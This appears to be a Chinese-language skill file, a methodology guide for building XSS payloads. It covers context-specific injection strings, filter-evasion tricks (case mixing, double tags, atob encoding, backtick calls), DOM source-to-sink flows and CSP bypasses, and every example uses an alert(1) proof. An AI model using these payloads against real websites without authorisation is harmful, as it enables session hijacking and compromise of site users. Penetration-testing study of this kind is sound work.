---
name: xss-construction
description: 原则: 根据上下文动态构造,不是套用固定 Payload 目标: 绕过过滤,适配不同上下文 (HTML/JS/Attribute/URL)
category: payload-construction
tags: [client]
---

# XSS Payload 构造思路

> **原则**: 根据上下文动态构造,不是套用固定 Payload
> **目标**: 绕过过滤,适配不同上下文 (HTML/JS/Attribute/URL)

---

## 思路 1: 上下文识别 (最关键)

**目标**: 先识别注入点在哪个上下文,再构造对应 Payload

### 1.1 HTML Body 上下文
```html
输入: <script>alert(1)</script>
反射: <div>用户输入: <script>alert(1)</script></div>
```
**构造**: 直接用标签 `<script>` / `<img>` / `<svg>`

### 1.2 HTML Attribute 上下文
```html
输入: " onmouseover="alert(1)
反射: <input value="用户输入: " onmouseover="alert(1)">
```
**构造**: 先闭合引号,再注入事件处理器

### 1.3 JavaScript 上下文
```javascript
输入: ';alert(1);//
反射: var name = '用户输入: ';alert(1);//';
```
**构造**: 先闭合字符串,再注入代码

### 1.4 URL 上下文
```html
输入: javascript:alert(1)
反射: <a href="用户输入: javascript:alert(1)">
```
**构造**: 用 `javascript:` 协议

**关键**: 不同上下文需要不同的闭合方式

---

## 思路 2: 快速探测

**目标**: 用最简单的 Payload 判断是否存在 XSS

### 2.1 探测反射
```
输入: <test123>
检查: 页面源码是否包含 <test123>
→ 如果包含,说明有反射
```

### 2.2 探测过滤
```
输入: <script>alert(1)</script>
检查: 
- 完全反射 → 无过滤,直接利用
- 被转义 &lt;script&gt; → HTML 实体编码
- 被删除 alert(1) → 标签被过滤
- 被替换 scriptalert(1)/script → 关键字被过滤
```

**不要**: 一上来就用复杂 Payload

---

## 思路 3: 标签和事件处理器选择

**目标**: 选择不容易被过滤的标签和事件

### 3.1 常用标签 (按优先级)

| 标签 | Payload | 优点 | 缺点 |
|------|---------|------|------|
| `<img>` | `<img src=x onerror=alert(1)>` | 最常用,兼容性好 | 容易被过滤 |
| `<svg>` | `<svg onload=alert(1)>` | 简洁,不需要 src | 部分浏览器不支持 |
| `<body>` | `<body onload=alert(1)>` | 自动触发 | 需要在 body 标签内 |
| `<iframe>` | `<iframe src=javascript:alert(1)>` | 强大 | 容易被过滤 |
| `<input>` | `<input onfocus=alert(1) autofocus>` | 自动触发 | 需要用户交互 |

### 3.2 事件处理器 (按优先级)

| 事件 | 触发条件 | 示例 |
|------|---------|------|
| `onerror` | 资源加载失败 | `<img src=x onerror=alert(1)>` |
| `onload` | 资源加载成功 | `<svg onload=alert(1)>` |
| `onfocus` | 元素获得焦点 | `<input onfocus=alert(1) autofocus>` |
| `onmouseover` | 鼠标悬停 | `<div onmouseover=alert(1)>` |
| `onclick` | 点击 | `<div onclick=alert(1)>` |

**关键**: 优先选择自动触发的事件 (onerror/onload/onfocus)

---

## 思路 4: 过滤绕过

**目标**: 绕过关键字和字符过滤

### 4.1 标签绕过

| 过滤 | 绕过方法 | 示例 |
|------|---------|------|
| `<script>` | 大小写 | `<ScRiPt>alert(1)</sCrIpT>` |
| `<script>` | 双写 | `<scr<script>ipt>alert(1)</script>` |
| `<script>` | 换标签 | `<img src=x onerror=alert(1)>` |
| 空格 | Tab/换行 | `<img\tsrc=x\nonerror=alert(1)>` |
| 引号 | 不用引号 | `<img src=x onerror=alert(1)>` |

### 4.2 关键字绕过

| 过滤 | 绕过方法 | 示例 |
|------|---------|------|
| `alert` | 编码 | `eval(atob('YWxlcnQoMSk='))` |
| `alert` | 拼接 | `window['al'+'ert'](1)` |
| `alert` | Unicode | `alert(1)` |
| `alert` | 其他函数 | `prompt(1)` / `confirm(1)` |

### 4.3 括号绕过

```javascript
// 如果过滤了 ()
alert`1`  // 模板字符串
throw onerror=alert,1  // throw + onerror
```

**关键**: 根据过滤规则动态调整

---

## 思路 5: DOM XSS

**目标**: 利用客户端 JavaScript 的不安全操作

### 5.1 常见 Source (输入源)

- `location.hash` - URL 片段
- `location.search` - URL 参数
- `document.referrer` - 来源页面
- `window.name` - 窗口名称
- `postMessage` - 跨窗口消息

### 5.2 常见 Sink (危险函数)

- `innerHTML` - 直接插入 HTML
- `document.write()` - 写入文档
- `eval()` - 执行代码
- `setTimeout()` / `setInterval()` - 延迟执行
- `location.href` - 跳转

### 5.3 构造示例

```javascript
// 如果代码是:
var hash = location.hash.substr(1);
document.getElementById('output').innerHTML = hash;

// Payload:
#<img src=x onerror=alert(1)>
```

**关键**: 找到 Source → Sink 的数据流

---

## 思路 6: CSP 绕过

**目标**: 绕过 Content Security Policy

### 6.1 识别 CSP

```
查看响应头: Content-Security-Policy
```

### 6.2 常见绕过

| CSP 配置 | 绕过方法 |
|---------|---------|
| `unsafe-inline` | 直接用内联脚本 |
| `unsafe-eval` | 用 `eval()` / `setTimeout()` |
| 允许 `data:` | `<script src="data:text/javascript,alert(1)">` |
| 允许特定域 | 找该域的 JSONP 端点 |
| `nonce` 泄露 | 复用泄露的 nonce |

**关键**: 先识别 CSP 配置,再针对性绕过

---

## 自我检查清单

- [ ] 是否识别了注入点的上下文? (HTML/JS/Attribute/URL)
- [ ] 是否先用简单 Payload 探测反射?
- [ ] 是否检查了过滤规则?
- [ ] 是否选择了自动触发的事件? (onerror/onload)
- [ ] 是否根据过滤动态调整 Payload?
- [ ] 是否检查了 CSP 配置?

---

## 常见错误

### 错误 1: 不识别上下文就构造 Payload

**问题**: HTML Body 的 Payload 在 JS 上下文不工作

**正确**: 先查看源码,确定注入点在哪个上下文

### 错误 2: 只测试 `<script>alert(1)</script>`

**问题**: 这个 Payload 最容易被过滤

**正确**: 优先用 `<img src=x onerror=alert(1)>`

### 错误 3: 忽略 DOM XSS

**问题**: 服务端无反射,但客户端有 DOM 操作

**正确**: 检查 JS 代码中的 `innerHTML` / `eval()` 等危险函数

---

**版本**: v1.0  
**更新日期**: 2026-04-25